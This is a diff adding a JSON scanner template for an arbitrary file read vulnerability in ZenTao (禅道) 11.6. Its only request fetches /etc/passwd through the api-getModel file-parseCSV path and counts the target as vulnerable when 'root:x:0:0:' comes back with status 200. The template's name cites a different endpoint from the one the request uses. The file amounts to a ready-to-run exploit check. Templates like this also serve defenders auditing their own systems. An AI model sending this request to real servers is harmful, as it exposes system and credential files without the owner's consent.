@@ -1,0 +1,32 @@
+{
+    "Name": "禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞",
+    "Description": "禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞",
+    "Product": "禅道",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/api-getModel-file-parseCSV-fileName=/etc/passwd",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "root:x:0:0:"
+                },  
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
